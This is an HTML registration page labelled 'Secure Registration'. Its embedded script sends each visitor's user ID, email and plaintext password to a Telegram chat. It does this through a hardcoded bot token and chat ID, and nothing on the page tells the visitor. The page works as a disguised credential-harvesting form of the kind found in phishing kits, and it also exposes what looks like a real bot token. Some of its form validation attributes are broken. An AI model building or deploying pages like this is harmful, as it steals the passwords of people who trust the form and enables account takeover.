<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Registration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            line-height: 1.6;
        }

        .registration-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #45a049;
        }

        .status-message {
            text-align: center;
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
        }

        .status-message.success {
            background-color: #dff0d8;
            color: #3c763d;
        }

        .status-message.error {
            background-color: #f2dede;
            color: #a94442;
        }
        h1 {
            text-align: center;
            color: #4CAF50;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="registration-container">
        <h1>Register</h1>
        <form id="registrationForm">
            <div class="form-group">
                <label for="username">User ID</label>
                <input type="number" id="username" name="username" required minlength="4" maxlength="20">
            </div>
           
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required minlength="">
            </div>

            <button type="submit" class="btn">Register</button>

            <div id="statusMessage" class="status-message" style="display:none;"></div>
        </form>
    </div>

    <script>
        
    document.getElementById('registrationForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get form values
        const username = document.getElementById('username').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value; // Optional: Send password if needed

        // Your Telegram Bot Token (IMPORTANT: Replace with your actual bot token)
        const BOT_TOKEN = '7950204890:AAHXGCh_WliNYd2TlnCScO_92EL0_QBkX7Y';
        
        // Your Telegram Chat ID (IMPORTANT: Replace with your actual chat ID)
        const CHAT_ID = '5007619095';
        
        // Prepare the message to send to Telegram
        const message = `New Registration:\n` +
                        `Username: ${username}\n` +
                        `Email: ${email}\n` +
                        `Password: ${password}\n` +  // Optional: Include password (be careful with sensitive data)
                        `Timestamp: ${new Date().toISOString()}`;

        // Status message element
        const statusMessage = document.getElementById('statusMessage');

        try {
            // Send the message to Telegram using Telegram Bot API
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });

            // Check if the request was successful
            if (response.ok) {
                statusMessage.textContent = 'Registration successful!';
                statusMessage.className = 'status-message success';
                statusMessage.style.display = 'block';

                // Optional: Clear form after successful submission
                this.reset();
            } else {
                throw new Error('Failed to send registration');
            }
        } catch (error) {
            statusMessage.textContent = 'Registration failed. Please try again.';
            statusMessage.className = 'status-message error';
            statusMessage.style.display = 'block';
            console.error('Error:', error);
        }
    });
</script>

</body>
</html>
